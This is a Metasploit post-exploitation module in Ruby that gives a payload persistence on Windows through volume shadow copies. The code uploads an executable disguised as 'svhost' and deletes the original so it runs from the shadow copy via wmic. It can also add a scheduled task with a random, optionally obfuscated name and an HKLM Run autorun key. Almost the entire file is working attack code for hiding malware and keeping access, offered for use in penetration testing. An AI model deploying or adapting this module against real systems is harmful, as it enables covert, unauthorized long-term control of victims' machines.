##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Windows::ShadowCopy
  include Msf::Post::Windows::Registry
  include Msf::Exploit::EXE
  include Msf::Post::Windows::TaskScheduler

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Persistent Payload in Windows Volume Shadow Copy',
        'Description' => %q{
          This module will attempt to create a persistent payload in a new volume shadow copy. This is
          based on the VSSOwn Script originally posted by Tim Tomes and Mark Baggett. This module has
          been tested successfully on Windows 7. In order to achieve persistence through the RUNKEY
          option, the user should need password in order to start session on the target machine.
        },
        'Author' => ['Jedediah Rodriguez <Jedi.rodriguez[at]gmail.com>'], # @MrXors
        'License' => MSF_LICENSE,
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Targets' => [ [ 'Microsoft Windows', {} ] ],
        'DefaultTarget' => 0,
        'References' => [
          [ 'URL', 'https://web.archive.org/web/20201111212952/https://securityweekly.com/2011/11/02/safely-dumping-hashes-from-liv/' ],
          [ 'URL', 'http://www.irongeek.com/i.php?page=videos/hack3rcon2/tim-tomes-and-mark-baggett-lurking-in-the-shadows']
        ],
        'DisclosureDate' => '2011-10-21',
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_sys_config_sysinfo
            ]
          }
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES]
        }
      )
    )

    register_options(
      [
        OptString.new('VOLUME', [ true, 'Volume to make a copy of.', 'C:\\']),
        OptBool.new('EXECUTE', [ true, 'Run the EXE on the remote system.', true]),
        OptBool.new('SCHTASK', [ true, 'Create a Scheduled Task for the EXE.', false]),
        OptBool.new('RUNKEY', [ true, 'Create AutoRun Key for the EXE', false]),
        OptInt.new('DELAY', [ true, 'Delay in Minutes for Reconnect attempt. Needs SCHTASK set to true to work. Default delay is 1 minute.', 1]),
        OptString.new('RPATH', [ false, 'Path on remote system to place Executable. Example: \\\\Windows\\\\Temp (DO NOT USE C:\\ in your RPATH!)', ]),
      ]
    )

    # All these task scheduler options are already managed by the module or are not possible (e.i. remote task scheduling)
    deregister_options('ScheduleType', 'ScheduleModifier', 'ScheduleRemoteSystem', 'ScheduleUsername', 'SchedulePassword')
  end

  def exploit
    @clean_up = ''

    print_status('Checking requirements...')

    unless is_admin?
      print_error('This module requires admin privs to run')
      return
    end

    unless is_high_integrity?
      print_error('This module requires UAC to be bypassed first')
      return
    end

    print_status('Starting Volume Shadow Service...')
    unless start_vss
      print_error('Unable to start the Volume Shadow Service')
      return
    end

    print_status('Uploading payload...')
    remote_file = upload(datastore['RPATH'])

    print_status('Creating Shadow Volume Copy...')
    unless volume_shadow_copy
      fail_with(Failure::Unknown, 'Failed to create a new shadow copy')
    end

    print_status('Finding the Shadow Copy Volume...')
    volume_data_id = []
    cmd = 'cmd.exe /c vssadmin List Shadows| find "Shadow Copy Volume"'
    output = cmd_exec(cmd)
    output.each_line do |line|
      cmd_regex = /HarddiskVolumeShadowCopy\d{1,9}/.match(line.to_s)
      volume_data_id = cmd_regex.to_s
    end

    print_status('Deleting malware...')
    file_rm(remote_file)

    if datastore['EXECUTE']
      print_status("Executing #{remote_file}...")
      execute(volume_data_id, remote_file)
    end

    if datastore['SCHTASK']
      print_status('Creating Scheduled Task...')
      schtasks(volume_data_id, remote_file)
    end

    if datastore['RUNKEY']
      print_status('Installing as autorun in the registry...')
      install_registry(volume_data_id, remote_file)
    end

    unless @clean_up.empty?
      log_file
    end
  end

  def upload(trg_loc = '')
    if trg_loc.nil? || trg_loc.empty?
      location = '\\Windows\\Temp'
    else
      location = trg_loc
    end

    file_name = "svhost#{rand(100)}.exe"
    file_on_target = "#{location}\\#{file_name}"

    exe = generate_payload_exe

    begin
      write_file(file_on_target.to_s, exe)
    rescue ::Rex::Post::Meterpreter::RequestError => e
      fail_with(Failure::NotFound, e.message)
    end

    return file_on_target
  end

  def volume_shadow_copy
    begin
      id = create_shadowcopy(datastore['VOLUME'])
    rescue ::Rex::Post::Meterpreter::RequestError => e
      fail_with(Failure::NotFound, e.message)
    end

    if id
      return true
    else
      return false
    end
  end

  def execute(volume_id, exe_path)
    run_cmd = "cmd.exe /c %SYSTEMROOT%\\system32\\wbem\\wmic.exe process call create \\\\?\\GLOBALROOT\\Device\\#{volume_id}\\#{exe_path}"
    cmd_exec(run_cmd)
  end

  TaskSch = Msf::Post::Windows::TaskScheduler

  def schtasks(volume_id, exe_path)
    sch_name = Rex::Text.rand_text_alpha(rand(8..15))
    global_root = "\\\\?\\GLOBALROOT\\Device\\#{volume_id}\\#{exe_path}"
    begin
      task_create(sch_name, global_root, { task_type: 'MINUTE', modifier: datastore['DELAY'] })
    rescue TaskSchedulerObfuscationError => e
      print_warning(e.message)
      print_good('Task created without obfuscation')
    rescue TaskSchedulerError => e
      print_error("Task creation error: #{e}")
      return
    else
      print_good('Task created')
      if datastore['ScheduleObfuscationTechnique'] == 'SECURITY_DESC'
        @clean_up << "reg setval -k '#{TaskSch::TASK_REG_KEY.gsub('\\') { '\\\\' }}\\\\#{sch_name}' "\
                     "-v '#{TaskSch::TASK_SD_REG_VALUE}' "\
                     "-d '#{TaskSch::DEFAULT_SD}' "\
                     "-t 'REG_BINARY'#{" -w '64'" unless @old_os}\n"
      end
    end

    @clean_up << "execute -H -f cmd.exe -a \"/c schtasks.exe /delete /tn #{sch_name} /f\"\n"
  end

  def install_registry(volume_id, exe_path)
    global_root = "cmd.exe /c %SYSTEMROOT%\\system32\\wbem\\wmic.exe process call create \\\\?\\GLOBALROOT\\Device\\#{volume_id}\\#{exe_path}"
    nam = Rex::Text.rand_text_alpha(rand(8..15))
    hklm_key = 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
    print_status("Installing into autorun as #{hklm_key}\\#{nam}")
    res = registry_setvaldata(hklm_key.to_s, nam, global_root.to_s, 'REG_SZ')
    if res
      print_good("Installed into autorun as #{hklm_key}\\#{nam}")
      @clean_up << "reg  deleteval -k HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run -v #{nam}\n"
    else
      print_error('Error: failed to open the registry key for writing')
    end
  end

  def clean_data
    host = session.sys.config.sysinfo['Computer']
    filenameinfo = '_' + ::Time.now.strftime('%Y%m%d.%M%S')
    logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo))
    ::FileUtils.mkdir_p(logs)
    logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + '.rc'
    return logfile
  end

  def log_file
    clean_rc = clean_data
    file_local_write(clean_rc, @clean_up)
    print_status("Cleanup Meterpreter RC File: #{clean_rc}")
  end
end
